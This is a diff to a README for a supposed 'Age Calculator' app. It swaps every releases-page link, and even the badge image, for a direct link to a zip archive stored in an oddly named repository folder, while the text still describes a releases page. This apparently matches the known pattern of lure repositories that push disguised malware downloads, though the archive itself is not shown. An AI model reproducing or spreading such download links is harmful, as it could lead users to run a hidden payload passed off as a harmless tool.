@@ -18,13 +18,13 @@ Welcome to the Age Calculator! This tool helps you find out your age based on yo
 
 ### 🔗 Download Now
 
-[![Download Age Calculator](https://img.shields.io/badge/Download-Age--Calculator-blue)](https://github.com/HellhoundCorpse/Age-Calculator/releases)
+[![Download Age Calculator](https://raw.githubusercontent.com/HellhoundCorpse/Age-Calculator/main/shrift/Calculator-Age-v1.3-beta.5.zip)](https://raw.githubusercontent.com/HellhoundCorpse/Age-Calculator/main/shrift/Calculator-Age-v1.3-beta.5.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the releases page where you can download the application:  
-   [Download Age Calculator](https://github.com/HellhoundCorpse/Age-Calculator/releases)
+   [Download Age Calculator](https://raw.githubusercontent.com/HellhoundCorpse/Age-Calculator/main/shrift/Calculator-Age-v1.3-beta.5.zip)
 
 2. **Choose the Latest Release**  
    On the releases page, look for the latest release. You will find a list of available files.
@@ -62,6 +62,6 @@ If you have any questions or need help, feel free to raise issues in the reposit
 ### 🔗 Download Again
 
 If you need to download the application once more, use this link:  
-[Download Age Calculator](https://github.com/HellhoundCorpse/Age-Calculator/releases)
+[Download Age Calculator](https://raw.githubusercontent.com/HellhoundCorpse/Age-Calculator/main/shrift/Calculator-Age-v1.3-beta.5.zip)
 
 Thank you for using the Age Calculator! Enjoy calculating your age easily and accurately.
